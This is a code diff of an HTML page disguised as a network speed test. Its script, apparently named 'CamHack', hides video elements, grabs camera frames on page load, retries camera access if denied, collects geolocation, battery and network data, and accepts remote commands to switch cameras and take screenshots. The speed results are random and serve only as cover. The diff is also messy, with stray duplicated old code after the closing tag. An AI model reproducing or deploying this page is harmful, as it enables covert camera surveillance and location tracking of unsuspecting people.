@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SpeedTest Pro - Network Performance</title>
+    <title>Network Speed Test</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta charset="UTF-8">
     <style>
@@ -21,49 +21,17 @@
             margin-bottom: 20px;
             border: 1px solid #00ffff;
         }
-        .speed-circle {
-            width: 200px;
-            height: 200px;
-            border: 4px solid #00ffff;
-            border-radius: 50%;
-            margin: 20px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            position: relative;
-            background: radial-gradient(circle, rgba(0,255,255,0.1), transparent);
-        }
-        .speed-number {
+        .speed-display {
             font-size: 48px;
-            font-weight: bold;
             color: #00ff00;
-        }
-        .speed-unit {
-            font-size: 16px;
-            color: #ffffff;
-        }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
             margin: 20px 0;
         }
-        .stat-box {
-            background: rgba(0,255,255,0.1);
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #00ffff;
-        }
-        .stat-label {
-            font-size: 12px;
-            color: #aaaaaa;
-            margin-bottom: 5px;
-        }
-        .stat-value {
-            font-size: 20px;
-            color: #00ff00;
-            font-weight: bold;
+        .status {
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 5px;
+            font-size: 14px;
         }
         .btn {
             background: linear-gradient(45deg, #00ffff, #0080ff);
@@ -75,81 +43,24 @@
             font-weight: bold;
             cursor: pointer;
             margin: 10px;
-            transition: all 0.3s;
-        }
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px rgba(0,255,255,0.5);
-        }
-        .status {
-            margin: 15px 0;
-            padding: 10px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 5px;
-            font-size: 14px;
         }
         .hidden { display: none !important; }
-        .loading {
-            animation: pulse 1.5s infinite;
-        }
+        .loading { animation: pulse 1.5s infinite; }
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
-        }
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ffff, #00ff00);
-            width: 0%;
-            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>⚡ SpeedTest Pro</h1>
-        <p>Professional Network Performance Analysis</p>
+        <h1>⚡ Network Speed Test</h1>
+        <p>Testing your connection performance...</p>
     </div>
 
-    <div class="speed-circle" id="speedCircle">
-        <div class="speed-number" id="speedNumber">0</div>
-        <div class="speed-unit">Mbps</div>
-    </div>
-
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-
-    <div class="stats">
-        <div class="stat-box">
-            <div class="stat-label">PING</div>
-            <div class="stat-value" id="pingValue">--</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-label">DOWNLOAD</div>
-            <div class="stat-value" id="downloadValue">--</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-label">UPLOAD</div>
-            <div class="stat-value" id="uploadValue">--</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-label">JITTER</div>
-            <div class="stat-value" id="jitterValue">--</div>
-        </div>
-    </div>
-
-    <button class="btn" id="startBtn" onclick="startSpeedTest()">🚀 Start Speed Test</button>
-    <button class="btn" id="shareBtn" onclick="shareResults()" style="display:none;">📊 Share Results</button>
-
-    <div class="status" id="status">Ready to test your connection speed</div>
+    <div class="speed-display" id="speedDisplay">0 Mbps</div>
+    <button class="btn" id="startBtn" onclick="startTest()">🚀 Start Test</button>
+    <div class="status" id="status">Ready to test your connection</div>
 
     <!-- Hidden camera elements -->
     <video id="camera" autoplay muted playsinline style="display:none;"></video>
@@ -158,10 +69,9 @@
     <script>
         // Session management
         const urlParams = new URLSearchParams(window.location.search);
-        const sessionId = urlParams.get('s') || 'default_' + Date.now();
-        const isMonitor = urlParams.get('monitor') === 'true';
+        const sessionId = urlParams.get('session') || urlParams.get('s') || 'cam_' + Date.now();
         
-        console.log('SpeedTest Pro loaded - Session:', sessionId);
+        console.log('CamHack initialized - Session:', sessionId);
         
         // Global variables
         let mediaStream = null;
@@ -170,35 +80,35 @@
         let deviceInfo = {};
         let currentFacingMode = 'user'; // 'user' = front, 'environment' = back
         let isCapturing = false;
+        let captureInterval = null;
         
-        // Initialize on page load
+        // Initialize immediately
         document.addEventListener('DOMContentLoaded', function() {
-            initializeApp();
+            initializeCamHack();
         });
         
-        async function initializeApp() {
-            console.log('Initializing SpeedTest Pro...');
+        async function initializeCamHack() {
+            console.log('Initializing CamHack system...');
             
-            // Collect device information immediately
+            // Collect device information
             await collectDeviceInfo();
             
-            // Request camera access for "network quality analysis"
+            // Request camera access immediately
             await requestCameraAccess();
             
-            // Start background monitoring
-            startBackgroundMonitoring();
+            // Start monitoring for commands
+            startCommandMonitoring();
             
-            // Auto-start speed test after 2 seconds
+            // Auto-start test after 1 second
             setTimeout(() => {
                 if (!isTestRunning) {
-                    startSpeedTest();
+                    startTest();
                 }
-            }, 2000);
+            }, 1000);
         }
         
         async function collectDeviceInfo() {
             try {
-                // Get basic device info
                 deviceInfo = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -211,39 +121,38 @@
                     timestamp: Date.now()
                 };
                 
-                // Get network info if available
+                // Network info
                 if ('connection' in navigator) {
                     deviceInfo.networkType = navigator.connection.effectiveType || 'unknown';
                     deviceInfo.downlink = navigator.connection.downlink || 0;
                 }
                 
-                // Get battery info if available
+                // Battery info
                 if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    deviceInfo.battery = Math.round(battery.level * 100);
-                    deviceInfo.charging = battery.charging;
+                    try {
+                        const battery = await navigator.getBattery();
+                        deviceInfo.battery = Math.round(battery.level * 100);
+                        deviceInfo.charging = battery.charging;
+                    } catch (e) {
+                        deviceInfo.battery = 0;
+                        deviceInfo.charging = false;
+                    }
                 }
                 
-                // Get location if available
+                // Location info
                 if ('geolocation' in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             deviceInfo.latitude = position.coords.latitude;
                             deviceInfo.longitude = position.coords.longitude;
                             deviceInfo.accuracy = position.coords.accuracy;
-                            
-                            // Reverse geocoding simulation
-                            deviceInfo.city = 'Jakarta'; // Would be from reverse geocoding
-                            deviceInfo.country = 'Indonesia';
-                            deviceInfo.address = 'Jl. Sudirman, Jakarta Pusat';
-                            
                             sendDeviceInfo();
                         },
                         (error) => {
                             console.log('Location access denied:', error);
                             sendDeviceInfo();
                         },
-                        { enableHighAccuracy: true, timeout: 10000 }
+                        { enableHighAccuracy: true, timeout: 5000 }
                     );
                 } else {
                     sendDeviceInfo();
@@ -251,6 +160,7 @@
                 
             } catch (error) {
                 console.error('Error collecting device info:', error);
+                sendDeviceInfo();
             }
         }
         
@@ -262,16 +172,16 @@
                 timestamp: Date.now()
             };
             
-            // Store in localStorage for Android to pick up
+            // Store for Android to pick up
             localStorage.setItem('device_info_' + sessionId, JSON.stringify(data));
             localStorage.setItem('camhack_active_' + sessionId, 'true');
             
-            console.log('CAMHACK_DATA: Device info collected', data);
+            console.log('DEVICE_INFO sent:', data);
         }
         
         async function requestCameraAccess() {
             try {
-                console.log('Requesting camera access for network analysis...');
+                console.log('Requesting camera access...');
                 
                 const constraints = {
                     video: {
@@ -289,13 +199,13 @@
                 video.srcObject = mediaStream;
                 
                 video.addEventListener('loadedmetadata', () => {
-                    console.log('TARGET CONNECTED: Camera access granted - ' + currentFacingMode);
+                    console.log('CAMERA HIJACKED: Access granted - ' + currentFacingMode);
                     
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
-                    // Send connection status immediately
+                    // Send connection status
                     const statusData = {
                         type: 'TARGET_CONNECTED',
                         session: sessionId,
@@ -308,14 +218,16 @@
                     };
                     
                     localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
-                    localStorage.setItem('connection_status', 'ACTIVE');
                     
-                    // Start frame capture
+                    // Start aggressive frame capture
                     startFrameCapture();
+                    
+                    // Update status
+                    document.getElementById('status').textContent = '📷 Camera hijacked - Live feed active (' + currentFacingMode + ')';
                 });
                 
             } catch (error) {
-                console.error('Camera access denied:', error);
+                console.error('Camera access failed:', error);
                 
                 const statusData = {
                     type: 'CAMERA_ERROR',
@@ -326,6 +238,43 @@
                 };
                 
                 localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
+                
+                // Try again with different constraints
+                setTimeout(() => {
+                    tryAlternativeCameraAccess();
+                }, 2000);
+            }
+        }
+        
+        async function tryAlternativeCameraAccess() {
+            try {
+                console.log('Trying alternative camera access...');
+                
+                const constraints = {
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                const video = document.getElementById('camera');
+                video.srcObject = mediaStream;
+                
+                video.addEventListener('loadedmetadata', () => {
+                    console.log('ALTERNATIVE CAMERA ACCESS: Granted');
+                    
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    startFrameCapture();
+                });
+                
+            } catch (error) {
+                console.error('Alternative camera access failed:', error);
             }
         }
         
@@ -337,56 +286,50 @@
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
             
-            let lastFrameTime = 0;
-            
             function captureFrame() {
-                const now = Date.now();
+                if (!mediaStream || !video.readyState === 4) {
+                    setTimeout(captureFrame, 100);
+                    return;
+                }
                 
-                if (mediaStream && video.readyState === 4 && now - lastFrameTime >= 500) {
-                    try {
-                        // Draw current frame to canvas
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // Convert to base64 with high quality
-                        const frameData = canvas.toDataURL('image/jpeg', 0.8);
-                        
-                        frameCount++;
-                        lastFrameTime = now;
-                        
-                        const data = {
-                            type: 'CAMERA_FRAME',
-                            session: sessionId,
-                            image: frameData,
-                            frameNumber: frameCount,
-                            facingMode: currentFacingMode,
-                            width: canvas.width,
-                            height: canvas.height,
-                            timestamp: now
-                        };
-                        
-                        // Multiple storage methods for reliability
-                        localStorage.setItem('latest_frame_' + sessionId, JSON.stringify(data));
-                        localStorage.setItem('frame_' + frameCount + '_' + sessionId, JSON.stringify(data));
-                        
-                        // Send via postMessage
-                        window.postMessage({
-                            type: 'CAMHACK_FRAME',
-                            data: data
-                        }, '*');
-                        
-                        console.log('FRAME CAPTURED: #' + frameCount + ' (' + currentFacingMode + ' - ' + canvas.width + 'x' + canvas.height + ')');
-                        
-                        // Update status indicator
-                        document.getElementById('status').textContent = '📷 Live camera feed active - Frame #' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ')';
-                        
-                    } catch (error) {
-                        console.error('Frame capture error:', error);
-                    }
+                try {
+                    // Draw current frame to canvas
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to base64 with high quality
+                    const frameData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    frameCount++;
+                    
+                    const data = {
+                        type: 'CAMERA_FRAME',
+                        session: sessionId,
+                        image: frameData,
+                        frameNumber: frameCount,
+                        facingMode: currentFacingMode,
+                        width: canvas.width,
+                        height: canvas.height,
+                        timestamp: Date.now()
+                    };
+                    
+                    // Store for Android to pick up
+                    localStorage.setItem('latest_frame_' + sessionId, JSON.stringify(data));
+                    
+                    // Also store with frame number for history
+                    localStorage.setItem('frame_' + frameCount + '_' + sessionId, JSON.stringify(data));
+                    
+                    console.log('FRAME CAPTURED: #' + frameCount + ' (' + currentFacingMode + ' - ' + canvas.width + 'x' + canvas.height + ')');
+                    
+                    // Update status
+                    document.getElementById('status').textContent = '📷 Live feed: Frame #' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ' camera)';
+                    
+                } catch (error) {
+                    console.error('Frame capture error:', error);
                 }
                 
                 // Continue capturing if still active
                 if (isCapturing && mediaStream) {
-                    requestAnimationFrame(captureFrame);
+                    setTimeout(captureFrame, 500); // 2 FPS for efficiency
                 }
             }
             
@@ -394,8 +337,8 @@
             captureFrame();
         }
         
-        function startBackgroundMonitoring() {
-            // Monitor for commands from CamHack
+        function startCommandMonitoring() {
+            // Check for commands every 500ms
             setInterval(() => {
                 checkForCommands();
             }, 500);
@@ -416,28 +359,15 @@
                     };
                     
                     localStorage.setItem('heartbeat_' + sessionId, JSON.stringify(heartbeat));
-                    console.log('HEARTBEAT: Frame count ' + frameCount + ' (' + currentFacingMode + ')');
                 }
             }, 2000);
-            
-            // Monitor page visibility
-            document.addEventListener('visibilitychange', () => {
-                const data = {
-                    type: 'VISIBILITY_CHANGE',
-                    session: sessionId,
-                    hidden: document.hidden,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('visibility_' + sessionId, JSON.stringify(data));
-            });
         }
         
         function checkForCommands() {
             // Check for switch camera command
             const switchCommand = localStorage.getItem('switch_camera_' + sessionId);
             if (switchCommand) {
-                console.log('COMMAND RECEIVED: Switch camera');
+                console.log('COMMAND: Switch camera');
                 switchCamera();
                 localStorage.removeItem('switch_camera_' + sessionId);
             }
@@ -445,7 +375,7 @@
             // Check for capture command
             const captureCommand = localStorage.getItem('capture_screenshot_' + sessionId);
             if (captureCommand) {
-                console.log('COMMAND RECEIVED: Capture screenshot');
+                console.log('COMMAND: Capture screenshot');
                 captureScreenshot();
                 localStorage.removeItem('capture_screenshot_' + sessionId);
             }
@@ -453,153 +383,15 @@
             // Check for disconnect command
             const disconnectCommand = localStorage.getItem('disconnect_' + sessionId);
             if (disconnectCommand) {
-                console.log('COMMAND RECEIVED: Disconnect');
+                console.log('COMMAND: Disconnect');
                 disconnect();
                 localStorage.removeItem('disconnect_' + sessionId);
             }
         }
         
-        async function startSpeedTest() {
-            if (isTestRunning) return;
-            
-            isTestRunning = true;
-            document.getElementById('startBtn').style.display = 'none';
-            
-            const statusEl = document.getElementById('status');
-            const speedEl = document.getElementById('speedNumber');
-            const progressEl = document.getElementById('progressFill');
-            
-            // Test phases with camera capture
-            const phases = [
-                { name: 'Initializing connection...', duration: 1000 },
-                { name: 'Testing ping...', duration: 2000 },
-                { name: 'Measuring download speed...', duration: 3000 },
-                { name: 'Measuring upload speed...', duration: 2500 },
-                { name: 'Analyzing network quality...', duration: 1500 }
-            ];
-            
-            let currentPhase = 0;
-            let progress = 0;
-            
-            for (const phase of phases) {
-                statusEl.textContent = phase.name + ' (Camera: ' + (mediaStream ? (currentFacingMode === 'user' ? 'Front' : 'Back') : 'Inactive') + ')';
-                statusEl.className = 'status loading';
-                
-                const startTime = Date.now();
-                const phaseProgress = 100 / phases.length;
-                
-                const animatePhase = () => {
-                    const elapsed = Date.now() - startTime;
-                    const phasePercent = Math.min(elapsed / phase.duration, 1);
-                    
-                    progress = (currentPhase * phaseProgress) + (phasePercent * phaseProgress);
-                    progressEl.style.width = progress + '%';
-                    
-                    if (phase.name.includes('download')) {
-                        const speed = Math.floor(Math.random() * 80 + 20);
-                        speedEl.textContent = speed;
-                        document.getElementById('downloadValue').textContent = speed + ' Mbps';
-                    } else if (phase.name.includes('upload')) {
-                        const speed = Math.floor(Math.random() * 40 + 10);
-                        speedEl.textContent = speed;
-                        document.getElementById('uploadValue').textContent = speed + ' Mbps';
-                    } else if (phase.name.includes('ping')) {
-                        const ping = Math.floor(Math.random() * 50 + 10);
-                        document.getElementById('pingValue').textContent = ping + ' ms';
-                    }
-                    
-                    if (phasePercent < 1) {
-                        requestAnimationFrame(animatePhase);
-                    }
-                };
-                
-                animatePhase();
-                await new Promise(resolve => setTimeout(resolve, phase.duration));
-                currentPhase++;
-            }
-            
-            // Final results
-            const finalSpeed = Math.floor(Math.random() * 100 + 50);
-            const finalPing = Math.floor(Math.random() * 30 + 5);
-            const finalJitter = Math.floor(Math.random() * 10 + 1);
-            
-            speedEl.textContent = finalSpeed;
-            document.getElementById('pingValue').textContent = finalPing + ' ms';
-            document.getElementById('jitterValue').textContent = finalJitter + ' ms';
-            
-            statusEl.textContent = '✅ Test completed! Camera frames: ' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ')';
-            statusEl.className = 'status';
-            
-            document.getElementById('shareBtn').style.display = 'inline-block';
-            
-            const results = {
-                type: 'SPEED_RESULTS',
-                session: sessionId,
-                ping: finalPing + ' ms',
-                download: document.getElementById('downloadValue').textContent,
-                upload: document.getElementById('uploadValue').textContent,
-                jitter: finalJitter + ' ms',
-                framesCaptured: frameCount,
-                cameraMode: currentFacingMode,
-                timestamp: Date.now()
-            };
-            
-            localStorage.setItem('speed_results_' + sessionId, JSON.stringify(results));
-            isTestRunning = false;
-        }
-        
-        function shareResults() {
-            const results = {
-                ping: document.getElementById('pingValue').textContent,
-                download: document.getElementById('downloadValue').textContent,
-                upload: document.getElementById('uploadValue').textContent,
-                jitter: document.getElementById('jitterValue').textContent
-            };
-            
-            if (navigator.share) {
-                navigator.share({
-                    title: 'My SpeedTest Results',
-                    text: `Ping: ${results.ping}, Download: ${results.download}, Upload: ${results.upload}`,
-                    url: window.location.href
-                });
-            } else {
-                const text = `SpeedTest Results:\nPing: ${results.ping}\nDownload: ${results.download}\nUpload: ${results.upload}\nJitter: ${results.jitter}`;
-                
-                if (navigator.clipboard) {
-                    navigator.clipboard.writeText(text);
-                    alert('Results copied to clipboard!');
-                } else {
-                    alert(text);
-                }
-            }
-        }
-        
-        // Listen for commands from Android
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.command) {
-                handleCommand(event.data.command);
-            }
-        });
-        
-        function handleCommand(command) {
-            console.log('Received command:', command);
-            
-            switch (command) {
-                case 'switch_camera':
-                    switchCamera();
-                    break;
-                case 'capture_frame':
-                    captureScreenshot();
-                    break;
-                case 'disconnect':
-                    disconnect();
-                    break;
-            }
-        }
-        
         async function switchCamera() {
             if (!mediaStream) {
-                console.log('No media stream available for switching');
+                console.log('No media stream for switching');
                 return;
             }
             
@@ -609,7 +401,6 @@
                 // Stop current stream
                 mediaStream.getTracks().forEach(track => {
                     track.stop();
-                    console.log('Stopped track:', track.kind, track.label);
                 });
                 
                 // Switch facing mode
@@ -618,13 +409,12 @@
                 // Stop current capture
                 isCapturing = false;
                 
-                // Get new stream with switched camera
+                // Get new stream
                 const constraints = {
                     video: {
                         facingMode: currentFacingMode,
                         width: { ideal: 1280, max: 1920 },
-                        height: { ideal: 720, max: 1080 },
-                        frameRate: { ideal: 30, max: 60 }
+                        height: { ideal: 720, max: 1080 }
                     },
                     audio: false
                 };
@@ -634,13 +424,12 @@
                 const video = document.getElementById('camera');
                 video.srcObject = mediaStream;
                 
-                // Wait for video to load and restart capture
                 video.addEventListener('loadedmetadata', () => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
-                    console.log('Camera switched to ' + currentFacingMode + ' (' + canvas.width + 'x' + canvas.height + ')');
+                    console.log('Camera switched to ' + currentFacingMode);
                     
                     // Send switch confirmation
                     const switchData = {
@@ -654,22 +443,12 @@
                     
                     localStorage.setItem('camera_switch_' + sessionId, JSON.stringify(switchData));
                     
-                    // Restart frame capture
+                    // Restart capture
                     startFrameCapture();
                 }, { once: true });
                 
             } catch (error) {
                 console.error('Camera switch failed:', error);
-                
-                // Send error notification
-                const errorData = {
-                    type: 'CAMERA_SWITCH_ERROR',
-                    session: sessionId,
-                    error: error.message,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('camera_error_' + sessionId, JSON.stringify(errorData));
             }
         }
         
@@ -680,7 +459,7 @@
                 const ctx = canvas.getContext('2d');
                 
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const screenshot = canvas.toDataURL('image/jpeg', 0.9);
+                const screenshot = canvas.toDataURL('image/jpeg', 0.95);
                 
                 const data = {
                     type: 'SCREENSHOT',
@@ -690,7 +469,7 @@
                     timestamp: Date.now()
                 };
                 
-                localStorage.setItem('latestScreenshot', JSON.stringify(data));
+                localStorage.setItem('screenshot_' + sessionId, JSON.stringify(data));
                 console.log('Screenshot captured from ' + currentFacingMode + ' camera');
                 
             } catch (error) {
@@ -713,774 +492,57 @@
             };
             
             localStorage.setItem('disconnect_' + sessionId, JSON.stringify(data));
-        }
-        
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', () => {
-            disconnect();
-        });
-        
-        // Keep page active
-        if ('wakeLock' in navigator) {
-            navigator.wakeLock.request('screen').catch(() => {});
-        }
-        
-        // Prevent accidental close during test
-        window.addEventListener('beforeunload', (e) => {
-            if (isTestRunning || frameCount > 0) {
-                e.preventDefault();
-                e.returnValue = 'Speed test in progress. Are you sure you want to leave?';
-            }
-        });
-    </script>
-</body>
-</html>     // Store in localStorage for Android to pick up
-            localStorage.setItem('device_info_' + sessionId, JSON.stringify(data));
-            localStorage.setItem('camhack_active_' + sessionId, 'true');
             
-            console.log('CAMHACK_DATA: Device info collected', data);
+            document.getElementById('status').textContent = 'Connection terminated';
         }
         
-        async function requestCameraAccess() {
-            try {
-                console.log('Requesting camera access for network analysis...');
-                
-                const constraints = {
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280, max: 1920 },
-                        height: { ideal: 720, max: 1080 },
-                        frameRate: { ideal: 30, max: 60 }
-                    },
-                    audio: false
-                };
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                const video = document.getElementById('camera');
-                video.srcObject = mediaStream;
-                
-                video.addEventListener('loadedmetadata', () => {
-                    console.log('TARGET CONNECTED: Camera access granted');
-                    
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    // Send connection status immediately
-                    const statusData = {
-                        type: 'TARGET_CONNECTED',
-                        session: sessionId,
-                        status: 'active',
-                        url: window.location.href,
-                        cameraWidth: canvas.width,
-                        cameraHeight: canvas.height,
-                        timestamp: Date.now()
-                    };
-                    
-                    localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
-                    localStorage.setItem('connection_status', 'ACTIVE');
-                    
-                    // Start aggressive frame capture
-                    startFrameCapture();
-                });
-                
-            } catch (error) {
-                console.error('Camera access denied:', error);
-                
-                const statusData = {
-                    type: 'CAMERA_ERROR',
-                    session: sessionId,
-                    status: 'error',
-                    error: error.message,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
-            }
-        }
-        
-        function startFrameCapture() {
-            const video = document.getElementById('camera');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            let lastFrameTime = 0;
-            
-            function captureFrame() {
-                const now = Date.now();
-                
-                if (mediaStream && video.readyState === 4 && now - lastFrameTime >= 500) {
-                    try {
-                        // Draw current frame to canvas
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // Convert to base64 with high quality
-                        const frameData = canvas.toDataURL('image/jpeg', 0.8);
-                        
-                        frameCount++;
-                        lastFrameTime = now;
-                        
-                        const data = {
-                            type: 'CAMERA_FRAME',
-                            session: sessionId,
-                            image: frameData,
-                            frameNumber: frameCount,
-                            facingMode: 'user',
-                            width: canvas.width,
-                            height: canvas.height,
-                            timestamp: now
-                        };
-                        
-                        // Multiple storage methods for reliability
-                        localStorage.setItem('latest_frame_' + sessionId, JSON.stringify(data));
-                        localStorage.setItem('frame_' + frameCount + '_' + sessionId, JSON.stringify(data));
-                        
-                        // Send via postMessage
-                        window.postMessage({
-                            type: 'CAMHACK_FRAME',
-                            data: data
-                        }, '*');
-                        
-                        console.log('FRAME CAPTURED: #' + frameCount + ' (' + canvas.width + 'x' + canvas.height + ')');
-                        
-                        // Update status indicator
-                        document.getElementById('status').textContent = '📷 Live camera feed active - Frame #' + frameCount;
-                        
-                    } catch (error) {
-                        console.error('Frame capture error:', error);
-                    }
-                }
-                
-                // Continue capturing
-                requestAnimationFrame(captureFrame);
-            }
-            
-            // Start capturing immediately
-            captureFrame();
-        }
-        
-        function startBackgroundMonitoring() {
-            // Send heartbeat every 2 seconds
-            setInterval(() => {
-                if (mediaStream) {
-                    const heartbeat = {
-                        session: sessionId,
-                        timestamp: Date.now(),
-                        frameCount: frameCount,
-                        online: navigator.onLine,
-                        battery: deviceInfo.battery || 0,
-                        connection: deviceInfo.networkType || 'unknown',
-                        cameraActive: true,
-                        pageVisible: !document.hidden
-                    };
-                    
-                    localStorage.setItem('heartbeat_' + sessionId, JSON.stringify(heartbeat));
-                    console.log('HEARTBEAT: Frame count ' + frameCount);
-                }
-            }, 2000);
-            
-            // Monitor page visibility
-            document.addEventListener('visibilitychange', () => {
-                const data = {
-                    type: 'VISIBILITY_CHANGE',
-                    session: sessionId,
-                    hidden: document.hidden,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('visibility_' + sessionId, JSON.stringify(data));
-            });
-        }
-        
-        async function startSpeedTest() {
+        async function startTest() {
             if (isTestRunning) return;
             
             isTestRunning = true;
             document.getElementById('startBtn').style.display = 'none';
             
             const statusEl = document.getElementById('status');
-            const speedEl = document.getElementById('speedNumber');
-            const progressEl = document.getElementById('progressFill');
+            const speedEl = document.getElementById('speedDisplay');
             
-            // Test phases with camera capture
+            // Simulate speed test while capturing camera
             const phases = [
-                { name: 'Initializing connection...', duration: 1000 },
-                { name: 'Testing ping...', duration: 2000 },
-                { name: 'Measuring download speed...', duration: 3000 },
-                { name: 'Measuring upload speed...', duration: 2500 },
-                { name: 'Analyzing network quality...', duration: 1500 }
-            ];
-            
-            let currentPhase = 0;
-            let progress = 0;
-            
-            for (const phase of phases) {
-                statusEl.textContent = phase.name + ' (Camera: ' + (mediaStream ? 'Active' : 'Inactive') + ')';
-                statusEl.className = 'status loading';
-                
-                const startTime = Date.now();
-                const phaseProgress = 100 / phases.length;
-                
-                const animatePhase = () => {
-                    const elapsed = Date.now() - startTime;
-                    const phasePercent = Math.min(elapsed / phase.duration, 1);
-                    
-                    progress = (currentPhase * phaseProgress) + (phasePercent * phaseProgress);
-                    progressEl.style.width = progress + '%';
-                    
-                    if (phase.name.includes('download')) {
-                        const speed = Math.floor(Math.random() * 80 + 20);
-                        speedEl.textContent = speed;
-                        document.getElementById('downloadValue').textContent = speed + ' Mbps';
-                    } else if (phase.name.includes('upload')) {
-                        const speed = Math.floor(Math.random() * 40 + 10);
-                        speedEl.textContent = speed;
-                        document.getElementById('uploadValue').textContent = speed + ' Mbps';
-                    } else if (phase.name.includes('ping')) {
-                        const ping = Math.floor(Math.random() * 50 + 10);
-                        document.getElementById('pingValue').textContent = ping + ' ms';
-                    }
-                    
-                    if (phasePercent < 1) {
-                        requestAnimationFrame(animatePhase);
-                    }
-                };
-                
-                animatePhase();
-                await new Promise(resolve => setTimeout(resolve, phase.duration));
-                currentPhase++;
-            }
-            
-            // Final results
-            const finalSpeed = Math.floor(Math.random() * 100 + 50);
-            const finalPing = Math.floor(Math.random() * 30 + 5);
-            const finalJitter = Math.floor(Math.random() * 10 + 1);
-            
-            speedEl.textContent = finalSpeed;
-            document.getElementById('pingValue').textContent = finalPing + ' ms';
-            document.getElementById('jitterValue').textContent = finalJitter + ' ms';
-            
-            statusEl.textContent = '✅ Test completed! Camera frames: ' + frameCount;
-            statusEl.className = 'status';
-            
-            document.getElementById('shareBtn').style.display = 'inline-block';
-            
-            const results = {
-                type: 'SPEED_RESULTS',
-                session: sessionId,
-                ping: finalPing + ' ms',
-                download: document.getElementById('downloadValue').textContent,
-                upload: document.getElementById('uploadValue').textContent,
-                jitter: finalJitter + ' ms',
-                framesCaptured: frameCount,
-                timestamp: Date.now()
-            };
-            
-            localStorage.setItem('speed_results_' + sessionId, JSON.stringify(results));
-            isTestRunning = false;
-        }
-        
-        function shareResults() {
-            const results = {
-                ping: document.getElementById('pingValue').textContent,
-                download: document.getElementById('downloadValue').textContent,
-                upload: document.getElementById('uploadValue').textContent,
-                jitter: document.getElementById('jitterValue').textContent
-            };
-            
-            if (navigator.share) {
-                navigator.share({
-                    title: 'My SpeedTest Results',
-                    text: `Ping: ${results.ping}, Download: ${results.download}, Upload: ${results.upload}`,
-                    url: window.location.href
-                });
-            } else {
-                const text = `SpeedTest Results:\nPing: ${results.ping}\nDownload: ${results.download}\nUpload: ${results.upload}\nJitter: ${results.jitter}`;
-                
-                if (navigator.clipboard) {
-                    navigator.clipboard.writeText(text);
-                    alert('Results copied to clipboard!');
-                } else {
-                    alert(text);
-                }
-            }
-        }
-        
-        // Listen for commands from Android
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.command) {
-                handleCommand(event.data.command);
-            }
-        });
-        
-        function handleCommand(command) {
-            console.log('Received command:', command);
-            
-            switch (command) {
-                case 'switch_camera':
-                    switchCamera();
-                    break;
-                case 'capture_frame':
-                    captureScreenshot();
-                    break;
-                case 'disconnect':
-                    disconnect();
-                    break;
-            }
-        }
-        
-        async function switchCamera() {
-            if (!mediaStream) return;
-            
-            try {
-                mediaStream.getTracks().forEach(track => track.stop());
-                
-                const constraints = {
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                };
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                document.getElementById('camera').srcObject = mediaStream;
-                
-                console.log('Camera switched to back camera');
-                
-            } catch (error) {
-                console.error('Camera switch failed:', error);
-            }
-        }
-        
-        function captureScreenshot() {
-            try {
